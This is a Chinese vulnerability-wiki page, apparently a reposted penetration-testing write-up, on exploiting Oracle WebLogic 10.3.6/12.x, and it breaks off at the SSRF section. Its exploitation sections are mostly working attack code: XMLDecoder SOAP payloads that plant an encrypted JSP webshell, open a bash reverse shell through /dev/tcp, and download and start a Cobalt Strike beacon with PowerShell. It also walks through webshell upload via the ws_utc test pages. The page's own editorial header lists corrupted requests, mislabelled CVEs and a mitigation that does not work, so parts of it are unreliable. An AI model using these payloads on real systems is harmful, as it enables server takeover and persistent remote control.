---
version: "10.3.6.0"
source: "MrWQ/vulnerability-paper"
title: "weblogic 中间件漏洞总结"
product: "Oracle WebLogic, custom configuration and Redis chain"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2017-10271; CVE-2017-3506; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551"
referenced_identifiers: "CVE-2015-4852; CVE-2016-0638; CVE-2016-3510; CVE-2017-3248; CVE-2018-2893"
identifier_role: "primary"
cve: "CVE-2017-10271; CVE-2017-3506; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551"
prerequisites: "Distinct per section: unpatched SOAP, T3/IIOP, enabled test pages, weak admin credentials, or privileged unauthenticated Redis"
affected_versions: "10.3.6.0"
source_url: "https://mp.weixin.qq.com/s/6X_JEveVf7R6acxCdD0sDg"
source_status: "recorded"
side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-b652d2e82dd178d3d0f0ea86"
entity_id: "ve-b652d2e82dd178d3d0f0ea86"
schema_version: "1"
---

# weblogic 中间件漏洞总结

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Distinct per section: unpatched SOAP, T3/IIOP, enabled test pages, weak admin credentials, or privileged unauthenticated Redis
- 证据范围：Full 37,814-character Markdown read in overlapping parts. Independent Windows/Linux lab screenshots add evidence but many repeated recipes and serious labels/detection/remediation errors require section-level normalization.

### 本次正文校订

- 按实际内容修正 5 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 14882 and 14883 roles reversed in reproduction headings
- SOAP/async/UDDI endpoint200 or ordinary response repeatedly asserted as proof of vulnerability; ignores patches
- HTTP404 incorrectly interpreted as non-HTTP protocol, and Redis6379 incorrectly called HTTP
- ConnectionFilterImpl selection without actual deny rules does not block T3
- Several HTTP requests collapsed and XML includes unescaped ampersands or missing attribute separators; Java/JSP contains backslash-brace corruption
- Spring XML starts with literal ## poc.xml and therefore invalid as shown
- Root cron write chain omits permissions/protected-mode/CONFIG restrictions and destructive overwrite warning
- 10271 object-tag write needs earlier3506 patch distinction; version lists incomplete/inconsistent between sections
- Installation command includes unsafe broad rm -rf /usr/bin/java*, third-party JDK download and unpinned environments
- Generic current/latest version claims are historical, developer versus production test-page auth conditions require clearer scope
- No removal of uploaded JSP, downloaded executables, cron change or configuration restoration

### 操作风险与资料使用

- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6X_JEveVf7R6acxCdD0sDg)

### 一. weblogic 简介

WebLogic 是美国 Oracle 公司出品的一个 application server 确切的说是一个基于 JAVAEE 架构的中间件，BEA WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

WebLogic Server 具有标准和可扩展性的优点，对业内多种标准都可全面支持，包括 EJB、JSP、Servlet、JMS、JDBC、XML（标准通用标记语言的子集）和 WML，使 Web 应用系统的实施更为简单，并且保护了投资，同时也使基于标准的解决方案的开发更加简便，同时 WebLogic Server 以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源 pooling 以及动态网页和 EJB 组件群集。

默认端口：7001

目前较为活跃的版本：

```
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.1
Weblogic 12.2.1.2
Weblogic 12.2.1.3
```

### 二. weblogic 安装

下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

weblogic 最新的版本需要 jdk1.8 以上，如果 jdk1.7 或者以下，可能会安装不了，jdk1.6 的话应该是 10.3.6 及以下。

#### weblogic 10.3.6 安装

这里安装环境为 win7

![](../../.resource/remote/079f75a48baf8bb9695fabb63c387610aa053a42675223b84d543c352b325c1a.png)image-20210809105230816![](../../.resource/remote/4b947eac1876d28df5b54735be2a713f17c1189ad9894253414cab3a01731ff2.png)image-20210809105644198

双击启动安装

![](../../.resource/remote/4870a8f680e05b5c7690d6e7939e87a762e756530fc0609573452399772cebf7.png)image-20210809105814087![](../../.resource/remote/1498162c8f5d16902fe60feb7b9b1a25b33fc298903707cd40b1f24a84e7a380.png)![](../../.resource/remote/03ecc7c026883b70faefabcf9b3b2475b6469b8079ddf08b3217058581d70d52.png)image-20210809110119887![](../../.resource/remote/62c51fd906140aa13b8e99410c35a9ed4d5e132c49f9d794b23da44cd0aa84d9.png)image-20210809110133160![](../../.resource/remote/88bac425505e85904c86b01d5d20ff98c4e9561d34ac1e3e511485ceb87dfb95.png)image-20210809110203679![](../../.resource/remote/787ecd16cc1c4c4f4dcfdd1807712b5ab94780d7bf4f4686b5303252ef7bfdd5.png)image-20210809110238157![](../../.resource/remote/d80b8154eeb9bfba8743f0a954716fc0a4fdbb2437d97c13bf8d78585bb4f90c.png)image-20210809154158552![](../../.resource/remote/056480845e6ea2a4b1ef07ff70f9f54e51800b602fc8f52b27e80495e6437362.png)image-20210809154229316![](../../.resource/remote/98712a02dae85040afbfb554656e66c3ec77756b77f7da76358f9a3d451becbe.png)image-20210809110431311![](../../.resource/remote/746e00ebaaaa52042faf7b6725c928a40ccf6ab8b3843fc85cc5fe754bf175c8.png)

安装完成后自动出现快速启动页面

![](../../.resource/remote/bc06a7ac4cf4a50ee547beb5dde1a0369857e04f060f2a7df491ad56210d2875.png)![](../../.resource/remote/2435fde0316b15e8605bb5f0a91f5f1e483ab271d3b759daf4ac25c86a11c1c7.png)image-20210809111057748![](../../.resource/remote/6ce5cfd82dfbad95539e22264207cb21ae30b6d5212666879bc75794b5922556.png)

这里默认即可

![](../../.resource/remote/6d0c4c8d6cc086fd5ebae934f6d8fbd2157af4d770a9a58eddd72f990be85beb.png)image-20210809111349116

这里我的是 zcc12345

![](../../.resource/remote/f05fce0737b9ddfd8d5824cb669620d00655d875605675cd0993c64cef79f4fd.png)

开发模式：该模式启用自动部署；生产模式：该模式关闭自动部署 (MyEcipse 版本不支持产品模式)

![](../../.resource/remote/51a42b8ad9d41c4e92fab50bbe030d3edb731507a76a106efe3491370a94a0a2.png)image-20210809134240451![](../../.resource/remote/778e8f84d857188ec8d0d9be7dcab7351162fe7650543d8676ff3646fe2fda30.png)image-20210809134317197![](../../.resource/remote/d5379de9aafbb695f7706d0b4d5bfc9a48f85ee187bb0a243c3c5d1e84fb8e68.png)image-20210809134433087

一直默认下一步之后点击创建

![](../../.resource/remote/a692b3f873c5c7283e34e33024eff33bfba000c8e779c7c49d919d55581f84f6.png)image-20210809134616650![](../../.resource/remote/4547ddb64b5173c878e22db36f3f6a45017ac0b4f1b91ad822a78ef4c8bad9bd.png)image-20210809134650091

#### weblogic 10.3.6 配置

进入该目录下，双击红框中的 startWebLogic.cmd，启动 weblogic

![](../../.resource/remote/fe36c9353a185614c38745d3a55ffdd718fd4d7565e69fe0036a2e5e947e7305.png)image-20210809134918621

输入刚刚设置的 weblogic 用户名和密码

```
weblogic
zcc12345
```

![](../../.resource/remote/4d1818f6b92c7f6cbb39f460c8f757475aeecd9a0e08f36747c83f9cf6c1793f.png)image-20210809135306951

打开浏览器输入控制台 url，进入控制台进行管理

```
http://192.168.10.154:7001/console/
```

image-20210809135607222![](../../.resource/remote/0f598ee84eaf9968e24740b5d9dae8082c5cfee785350b865748e9540f2dff24.png)

用户名密码还是上面设置的 weblogic/zcc12345

#### weblogic 12.1.3 安装

12 版本的安装需要在 jdk7 的环境下，这里我已经安装完成

![](../../.resource/remote/364b1d619c41466ff62c5337f4320da857a3a02006e9548ba7115168feacb183.png)image-20210814161036126![](../../.resource/remote/fbcbcd969e6805b082f9356df3e5674a9e56f4a82ea52569b283529e20672c92.png)image-20210814162020929

官网下载安装包，官网链接：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

![](../../.resource/remote/b42ad19a6ae2c2c4c10d071bef7c1d94de8b3bb7873ce3e8ff0dd22da148d006.png)image-20210814160458436

将下载好的安装包放入 jdk 的 bin 目录下，防止因环境变量带空格导致的错误，过程一直默认下一步即可

![](../../.resource/remote/9be3b2998f16ddd396bd47c021191a47b7ad24bc8527672f7cd77a566ad5a5c7.png)image-20210814162427162

这里一定要以管理员身份运行，不然提取文件会失败

```
java -jar fmw_12.1.3.0.0_wls.jar
```

![](../../.resource/remote/598ec92702304e0a5434162b9ccb5a1400a7ee976ef1d0972d2151b1a3126a99.png)image-20210814163432029![](../../.resource/remote/4f1e6eb343ee0222a84a790ca5e7ee5e8f79f81aa77d375a449c0739a7ab78d8.png)![](../../.resource/remote/94f593b6288e960c459d52dc42a751c546477ecd2c8fa42609aa4c8978de86d2.png)image-20210814165250515![](../../.resource/remote/ed4e729f932980b6dd8424e806b457524a81f3bb6bb4abb309e726b6f450abe1.png)image-20210814165616715

接下来安装域

在电脑上找到 Configuration Wizard，双击运行

![](../../.resource/remote/582da133575d95ea1fd98c95a717e9faf34185f5f4deb69724c410a446cacd2c.png)image-20210814165704899

选择下一步 -> 下一步

![](../../.resource/remote/50cd2c18ab4047a78a0629401f9c40e5be874f1d4add7b4f0b0026d0446f872b.png)image-20210814165802594

输入口令，这里用户名默认，口令设置的是 zcc12345

![](../../.resource/remote/8a07dfc8077ef10db60e0fb3e0224b6314030d5df4ed4b875fa8181ed031c598.png)image-20210814165857818

下一步

![](../../.resource/remote/17485a880f9e5ffb76d6f74b302c436bb623ec8162d695ddb2a1dc1ac15185ad.png)image-20210814165945030![](../../.resource/remote/bb8585e7919b61d3ece46ed83b921eceb70e796187b30efbf0304546b7db4711.png)image-20210814165958254

选本机 IP

![](../../.resource/remote/19f124201a321099afe1c50bda6b9c3fdb9102b4eb078c82a6606df6ce37290e.png)image-20210814170040154![](../../.resource/remote/8c40712525c5a8ad02542945354cde55ff5d4cc93c0e14828ecc95d778d8b8dd.png)image-20210814170128516![](../../.resource/remote/a44796cf5740d83553c349136daaa32484aae28e04e8b4539799cb7c2fa3ad28.png)image-20210814170217064![](../../.resource/remote/82189c3c14de8de86f84925f50b261572d56f35729c9ffe62b8c3d5d98fe8969.png)image-20210814170242532![](../../.resource/remote/8623c6d794ed62ec4b5d94c09ab09817fccd5f741a6693b5960315a32a6a415b.png)image-20210814170306146

#### weblogic 12.1.3 配置

进入该目录下启动，这里不再需要输入账号密码

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain
```

![](../../.resource/remote/90624047be63d582950b063fa23ad8b5c6b62a678164184752fa005e1c043bfc.png)image-20210814170531939![](../../.resource/remote/0d44f97092bea51e2d106490e7b5f5527cdc129cd5c4f8ddb582cbe6482a3c49.png)

成功搭建，可正常访问。

### 三. weblogic 渗透总结

#### 1.XMLDecoder 反序列化漏洞 CVE-2017-10271

##### 漏洞简介

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

##### 影响版本

```
10.3.6.0
12.1.3.0.0
12.2.1.1.0
```

##### 验证漏洞

当访问该路径 /wls-wsat/CoordinatorPortType （POST），出现如下图所示的回显时，只要是在 wls-wsat 包中的皆受到影响，可以查看 web.xml 查看所有受影响的 url，说明存在该漏洞；

![](../../.resource/remote/76af44e941b68d2570544d032b9ecfdb95a99a0fd7e816d606a55c2e27db13bb.png)image-20210809140942304

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF
```

进行该路径查看 web.xml;

![](../../.resource/remote/66a242587937ac07c57913d1eebb7acb47719a138b32a6e3f45ebf515c1c407a.png)image-20210809141314849![](../../.resource/remote/a8f309080662d3f7a7f0d12d87db190a11a48a6612a22aab854e4724da2932ba.png)image-20210809141512699

总结下来就是下面这些 url 会受到影响；

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

##### 漏洞复现

抓包，修改内容

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java><java version="1.4.0" class="java.beans.XMLDecoder"> <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc.jsp</string> <void method="println"><string> <![CDATA[<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> ]]> </string> </void> <void method="close"/> </object></java></java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
```

![](../../.resource/remote/47d08a9b2cc23fe7fa6924f8731300b72f81730e9bcd7bb45ca94ac88145e479.png)![](../../.resource/remote/41ca7137477ad969547c59d1eb420570113318448b6942301ea39b54ba4a786b.png)image-20210809162737924![](../../.resource/remote/e4934fbdddf186bc21f80d955c8fe0bd5061759b745d845392a28c53614d916c.png)image-20210809162717485

实现 Linux 反弹 shell 的 poc：

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: x.x.x.x:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 637<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/x.x.x.x/4444 0>&1</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
```

实现 win 上线 cs

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.10.154:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 704<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string> </void> <void index="1"> <string>-Command</string> </void> <void index="2"> <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
```

cs 生成后门木马

![](../../.resource/remote/d31b87cdc6bd90a3e9e772cc770b90bb4dae2f5fb511a6ae9fe17d89109aba23.png)image-20210810105923024

放在 kali 上，开启简易的 http 服务

![](../../.resource/remote/29bcd804009e25857fa9a3c8c0943de1640a74f1ec6ceb357c42e12e4ae67463.png)image-20210810110037377

powershell 上线 cs：

```
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe
```

![](../../.resource/remote/024f1107576a44eab3b9569c0ff17f9f9794a8458a4ab8a793fc3a810028e3d9.png)image-20210810111100065![](../../.resource/remote/f79caf1d735048b5a6e6821d433cdf9158b6a689056ea18c28c7c4cfe71aaf93.png)image-20210810110916447

成功上线 cs

##### 安全防护

前往 Oracle 官网下载 10 月份所提供的安全补丁：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

#### 2.XMLDecoder 反序列化漏洞 CVE-2017-3506

##### 漏洞简介

cve-2017-10271 与 3506 他们的漏洞原理是一样的, 只不过 10271 绕过了 3506 的补丁，CVE-2017-3506 的补丁加了验证函数，验证 Payload 中的节点是否存在 object Tag。

```
private void validate(InputStream is){ WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser =factory.newSAXParser(); parser.parse(is, newDefaultHandler() { public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException { if(qName.equalsIgnoreCase("object")) { throw new IllegalStateException("Invalid context type: object"); } } }); } catch(ParserConfigurationException var5) { throw new IllegalStateException("Parser Exception", var5); } catch (SAXExceptionvar6) { throw new IllegalStateException("Parser Exception", var6); } catch (IOExceptionvar7) { throw new IllegalStateException("Parser Exception", var7); } }
```

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.0
12.2.1.1 
12.2.1.2
```

##### 漏洞复现

利用的 poc:

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java> <object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc3.jsp</string> <void method="println"> <string> <![CDATA[ <% out.print("zcc1 hello"); %> ]]> </string> </void> <void method="close"/> </object> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
```

![](../../.resource/remote/d1b523e801704281d6506d2728c08a7ed145f35d2c916d42b6f49da895f4e66f.png)![](../../.resource/remote/839e17c25239b9d675711fb323b8942edbbcd3e1978002c7dee99ff4aeb7e1f2.png)image-20210810141515224

##### 安全防护

前往 Oracle 官网下载 10 月份所提供的安全补丁：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

#### 3.wls-wsat 反序列化远程代码执行漏洞 CVE-2019-2725

##### 漏洞简介

此漏洞实际上是 CVE-2017-10271 的又一入口，CVE-2017-3506 的补丁过滤了 object；CVE-2017-10271 的补丁过滤了 new，method 标签，且 void 后面只能跟 index，array 后面只能跟 byte 类型的 class；CVE-2019-2725 的补丁过滤了 class，限制了 array 标签中的 byte 长度。

##### 影响组件

```
bea_wls9_async_response.war
wsat.war
```

##### 影响版本

```
10.3.*
12.1.3
```

##### 验证漏洞

访问  /_async/AsyncResponseService，返回 200 则存在，404 则不存在

查看 web.xml 得知受影响的 url 如下：

访问路径为：

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF
```

![](../../.resource/remote/504599479824ac7e569db780289cc677cfb33fdab88cc6ab95ad6cdcfbaaa8fb.png)image-20210810143210331

```
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps
/_async/AsyncResponseServiceSoap12
/_async/AsyncResponseServiceSoap12Jms
/_async/AsyncResponseServiceSoap12Https
```

##### 漏洞复现

访问该 url，回显如下，说明存在漏洞

![](../../.resource/remote/d007db459208c662976b89e36e80498b46fa67ba2b4748653b942ceecd898175.png)image-20210810142738800

win 上线 cs 的 poc 如下，这里 exe 用的是上面生成的：

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string></void><void index="1"><string>-Command</string></void><void index="2"><string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc1.exe','zcc1.exe');start-process zcc1.exe</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

![](../../.resource/remote/6b98e6658eb2cdea04b5e56aa52da8dbb5473841d365934c0871171bf506d481.png)![](../../.resource/remote/1c066d660b7e8cef1f044bbec3624a0d7188543631731585e4ce0f06c8ad86ed.png)

##### 安全防护

1、升级本地 JDK 环境

2、及时安装官方补丁

#### 4.WebLogic T3 协议反序列化命令执行漏洞 CVE-2018-2628

##### 漏洞简介

远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过 T3 协议（EJB 支持远程访问，且支持多种协议。这是 Web Container 和 EJB Container 的主要区别）在 Weblogic Server 中执行反序列化操作，利用 RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java Remote Messaging Protocol：java 远程消息交换协议）达到执行任意反序列化 payload 的目的。

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.1
12.2.1.2
```

##### 相关漏洞

```
CVE-2015-4852
CVE-2016-0638
CVE-2016-3510
CVE-2017-3248
CVE-2018-2893
CVE-2016-0638
```

##### 验证漏洞

使用脚本跑，脚本运行需 python2 环境，出现如下图所示的回显时，说明存在该漏洞；

脚本链接：https://github.com/shengqi158/CVE-2018-2628

![](../../.resource/remote/9a89e84db61b932d7325f52f9fff79af3f2a7d3353f22322c1c09fe9df2db783.png)image-20210810160702675![](../../.resource/remote/0cd8f51397d7db38c6f5f46ce04950885d7b801a7c104a8ef948949a23668caa.png)image-20210810160718697

##### 漏洞复现

windows-getshell，使用 k8weblogicGUI.exe

![](../../.resource/remote/145a4f9e2b3ef0f9fa4b54f66f33708184844b69d6c765f90111a7e114090e5c.png)image-20210810163031055

这里出了点问题，文件名改成了 1.jsp

![](../../.resource/remote/25dad53e5302fc46e751552cff09f8aaa80fc9af8e81d49966d2da5323e62bbb.png)image-20210810164738168

用脚本连接得到交互 shell, 脚本运行需 python2 环境

脚本链接：https://github.com/jas502n/CVE-2018-2628

![](../../.resource/remote/01d3ff7517bd575efe92291e8bcd453f0d57ee016604bb2560438b2e80c87542.png)image-20210810165228766

在此处上线 cs，用的依旧是上面的马，改名 zcc3.exe

```
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc3.exe','zcc3.exe');start-process zcc3.exe
```

![](../../.resource/remote/21af53c7584262157f1e47b0d39838187f94773be12d79e5ffe7f412eb1fcd8e.png)image-20210810170001387![](../../.resource/remote/a525c34d7e11ecae3cba228bdd7bfde975dfe1685f4e82923ee5334285c67b05.png)image-20210810170039655

##### 安全防护

过滤 t3 协议，再域结构中点击 安全 -> 筛选器，选择筛选器填：

```
weblogic.security.net.ConnectionFilterImpl
```

![](../../.resource/remote/a8aa17df9d4d8eba6923a19ae5ef349ae42729478f0ffcae5d0537f8edf67b57.png)image-20210813140332501

保存后重启 weblogic 即可。

#### 5.WebLogic 未授权访问漏洞（CVE-2018-2894）

##### 漏洞简介

Weblogic Web Service Test Page 中有两个未授权页面，可以上传任意文件。但是有一定的限制，该页面在开发模式下存在，在生产模式下默认不开启，如果是生产模式，需要登陆后台进行勾选启动 web 服务测试页，如下图。

![](../../.resource/remote/2313bec851a9adbfa247745d7b6e6182a19831f791963890f947142eb848cacc.png)image-20210813145148182

##### 影响版本

```
10.3.6
12.1.3
12.2.1.2
12.2.1.3
```

##### 验证漏洞

测试页有两个

```
/ws_utc/config.do
/ws_utc/begin.do
```

##### 漏洞复现

这里要注意的是 12 版本，以前以及现在的默认安装是 “开发模式”，“生产模式” 下没有这两处上传点。如果是生产模式，需要登陆后台进行如下配置：（开发环境下不需要！！）

![](../../.resource/remote/952ed8bdf4bbd8b64610ec195c5aa9b0aec3ec9cafa16d9893dc5bd035b2e7ba.png)image-20210814171049349![](../../.resource/remote/e1057f491c42d2e0b5c8431243b6bdcc65eae92210fe2cab5db0592395f9d8ed.png)

勾选启用 web 服务测试项，保存重启 weblogic 即可

![](../../.resource/remote/724acb2c16f74742827fc2849c68d9fae2da4ee708d5ba1af99c3c1813d0829f.png)

> 1. 测试 / ws_utc/config.do

访问 / ws_utc/config.do 页面，首先设置一下路径，设置 Work Home Dir 为 ws_utc 应用的静态文件 css 目录，因为默认上传目录不在 Web 目录无法执行 webshell，这里设置为：(css 访问不需要任何权限)

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css
```

![](../../.resource/remote/ad40ec8ba0ba710f8b803a3e48ace64b05a16cf897970e86d4d403bc7c630f77.png)![](../../.resource/remote/2688d61920cb58cc570a05760877f2d3cd5a61960ba22e6fc416e8a43c2505d4.png)![](../../.resource/remote/46b9928812e107aa7d241de7dadbe178ebd737961b9d6122e7373a4784ec2ad3.png)image-20210813152013436

提交后，点击左边安全 -> 添加，上传 jsp 大马

![](../../.resource/remote/1051ebd11993212a273d9cb9bf9b01467583681c1d4d9c9b72fe078c67f4d2cf.png)![](../../.resource/remote/c51ef6082e419cbfcd5167be2d732d6c7696dcf9d2e8cfb97ce010a3aaa2e612.png)

获取文件 id：1628933663766

![](../../.resource/remote/3fa37f56e12b1e3240b98641be788a7deb99640e41f5d05bc4ed358e2524c2bf.png)

访问 url：

```
http://192.168.0.105/:7001/ws_utc/css/config/keystore/{时间戳}_{文件名}
http://192.168.0.105:7001/ws_utc/css/config/keystore/1628933663766_JspSpy.jsp
```

![](../../.resource/remote/03739edbc855557dce3e3ad4223ccda0e851fe68cdaa8b2b36194de644b6f659.png)image-20210814173547786

输入密码

![](../../.resource/remote/eba5b7e9b232c0de406abec777f994405ba3a39f5415711153029cf1fc7db5b9.png)image-20210814173903964![](../../.resource/remote/08f7e2ca92f7aa2a6abff24d3d66bca688e394793493de03866b269e42e83940.png)image-20210814174004800

可以看见成功上线，同样方法也可以上传一句话或者其他木马。

> 2. 测试 /ws_utc/begin.do

大致方法和上面的 url 一样，这里需要注意的是

```
1./ws_utc/begin.do使用的工作目录是在/ws_utc/config.do中设置的Work Home Dir；
2.利用需要知道部署应用的web目录；
3.在生产模式下不开启，后台开启后，需要认证。
```

![](../../.resource/remote/52c80cdd7235a81a2b8d2e1d3f39c9d48551358019e9c9149d104c4b9feb30f3.png)image-20210814175127172image-20210814175507654![](../../.resource/remote/1a85bfa556402df48308ffbe5fdc9057c9d10a6a0e0e6f1800b54838a3432e84.png)image-20210814180116136

报错可以忽略，返回包中已有文件路径

```
/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
```

![](../../.resource/remote/3def4687a26def13f4d53bd22e782fcb1e1fd14ec23faa64a209fa0de766eda8.png)image-20210814180054350

访问路径，成功访问，powershell 上线 cs

```
http://192.168.0.105:7001/ws_utc/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
```

![](../../.resource/remote/b7341df0c8b29bc17fa70b77fb4aca5c79a4d3785dc11c01093d6bec72025083.png)

```
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.108/zcc.exe','zcc.exe');start-process zcc.exe
```

![](../../.resource/remote/b4533b4ab7bed5f6348a16483a6be7280b1eebbedf5b41da4ff54ee21261999f.png)![](../../.resource/remote/24b86e3b3415f02b5a073a00e6bf38668f9511b3b64833110db6a11aa4b783e6.png)image-20210814181718937

##### 安全防护

1. 启动生产模式后 Config.do 页面登录授权后才可访问

2. 升级到最新版本，目前生产模式下已取消这两处上传文件的地方。

#### 6.Weblogic SSRF 漏洞（CVE-2014-4210）

##### 漏洞简介

Oracle WebLogic Web Server 既可以被外部主机访问，同时也允许访问内部主机。比如有一个 jsp 页面 SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过 weblogic server 连接任意主机的任意 TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口，进而攻击内网中 redis、fastcgi 等脆弱组件。

##### 影响版本

```
